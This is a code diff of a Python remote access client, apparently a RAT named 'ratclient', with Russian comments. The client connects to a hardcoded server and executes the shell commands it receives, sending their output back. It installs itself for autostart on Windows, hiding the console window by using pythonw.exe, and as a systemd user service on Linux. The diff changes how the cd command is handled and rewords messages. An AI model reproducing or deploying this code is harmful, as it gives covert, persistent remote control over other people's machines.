@@ -8,10 +8,9 @@ SERVER_IP = "192.168.100.3"  # Жёстко заданный IP
 SERVER_PORT = 5000
 BUFFER_SIZE = 4096
 
-def execute_command(command, cwd):
+def execute_command(command):
     try:
-        # Выполняем команду в указанной директории
-        output = subprocess.getoutput(f"cd \"{cwd}\" && {command}")
+        output = subprocess.getoutput(command)
         return output
     except Exception as e:
         return f"Ошибка выполнения команды: {e}"
@@ -28,7 +27,7 @@ def add_to_autostart_windows():
     try:
         exe_path = sys.executable
         script_path = os.path.abspath(__file__)
-        # Используем pythonw.exe, если существует, чтобы не показывалось окно консоли
+        # Используем pythonw.exe, если он есть, чтобы не показывалось окно консоли
         if exe_path.lower().endswith("python.exe"):
             pythonw_path = exe_path[:-4] + "w.exe"
             if os.path.exists(pythonw_path):
@@ -67,7 +66,7 @@ def is_in_autostart_windows():
 def add_to_autostart_linux():
     """
     Создаёт systemd юзер-сервис в ~/.config/systemd/user/ratclient.service
-    и активирует его.
+    и включает его.
     """
     home = os.path.expanduser("~")
     systemd_dir = os.path.join(home, ".config", "systemd", "user")
@@ -92,27 +91,24 @@ RestartSec=5
 WantedBy=default.target
 """
 
-    # Если сервис уже существует и совпадает, пропускаем
     if os.path.exists(service_path):
         with open(service_path, "r", encoding="utf-8") as f:
             existing = f.read()
         if existing == service_content:
             return True, f"systemd сервис уже установлен: {service_path}"
 
-    # Записываем сервис
     try:
         with open(service_path, "w", encoding="utf-8") as f:
             f.write(service_content)
     except Exception as e:
-        return False, f"Ошибка записи systemd unit файла: {e}"
+        return False, f"Ошибка записи файла systemd unit: {e}"
 
-    # Перезагружаем systemd и включаем сервис
     try:
         subprocess.run(["systemctl", "--user", "daemon-reload"], check=True)
         subprocess.run(["systemctl", "--user", "enable", "ratclient.service"], check=True)
         subprocess.run(["systemctl", "--user", "start", "ratclient.service"], check=True)
     except Exception as e:
-        return False, f"Ошибка при работе с systemctl: {e}"
+        return False, f"Ошибка в systemctl: {e}"
 
     return True, f"systemd сервис установлен и запущен: {service_path}"
 
@@ -127,17 +123,17 @@ def add_self_to_autostart():
             success, msg = add_to_autostart_windows()
             print(msg)
         else:
-            print("Уже добавлен в автозапуск Windows")
+            print("Уже добавлен в автозагрузку Windows")
     else:
         if not is_in_autostart_linux():
             success, msg = add_to_autostart_linux()
             print(msg)
-            print("Если сервис не стартует после перезагрузки, выполните: sudo loginctl enable-linger $USER")
+            print("Если сервис не стартует после перезагрузки, выполните в терминале:")
+            print("sudo loginctl enable-linger $USER")
         else:
             print("Уже добавлен в systemd автозапуск")
 
 def main():
-    # Добавляем себя в автозапуск (если ещё не добавлен)
     try:
         add_self_to_autostart()
     except Exception as e:
@@ -161,21 +157,20 @@ def main():
                 if data == "exit":
                     break
 
-                # Обработка команды cd
-                if data.startswith("cd "):
-                    path = data[3:].strip()
-                    try:
-                        os.chdir(path)
-                        current_dir = os.getcwd()
-                        s.send(f"Сменена директория на {current_dir}".encode(errors='ignore'))
-                    except Exception as e:
-                        s.send(f"Ошибка смены директории: {e}".encode(errors='ignore'))
-                    continue
-
+                # Обработка команды cd отдельно
                 if data.startswith("cmd:"):
                     cmd = data[4:]
-                    output = execute_command(cmd, current_dir)
-                    s.send(output.encode(errors='ignore'))
+                    if cmd.startswith("cd "):
+                        path = cmd[3:].strip()
+                        try:
+                            os.chdir(path)
+                            current_dir = os.getcwd()
+                            s.send(f"Сменена директория на {current_dir}".encode(errors='ignore'))
+                        except Exception as e:
+                            s.send(f"Ошибка смены директории: {e}".encode(errors='ignore'))
+                    else:
+                        output = execute_command(cmd)
+                        s.send(output.encode(errors='ignore'))
 
                 elif data == "process_list":
                     if is_windows():
